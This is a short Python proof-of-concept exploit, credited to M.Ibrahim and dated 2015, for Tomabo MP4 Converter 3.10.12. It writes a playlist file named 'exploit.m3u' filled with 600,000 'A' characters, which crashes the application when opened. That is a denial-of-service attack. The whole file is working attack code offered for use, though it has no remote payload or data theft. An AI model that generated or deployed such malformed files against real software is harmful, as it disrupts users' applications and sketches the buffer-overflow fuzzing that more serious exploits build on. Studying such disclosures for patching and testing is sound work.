#!/usr/bin/python
# Exploit Title: Tomabo MP4 Converter 3.10.12 - (.m3u) Denial of service (Crush application)

# Date: [8-10-2015]
# Exploit Author: [M.Ibrahim]  vulnbug@gmail.com
# E-Mail:  vulnbug  <at>  gmail.com
# Vendor Homepage: http://www.tomabo.com/mp4-converter/index.html
# Version: [3.10.12] 
# Tested on: windows 7 x86


junk="A"*600000
file = "exploit.m3u"
f=open(file,"w")
f.write(junk);
f.close();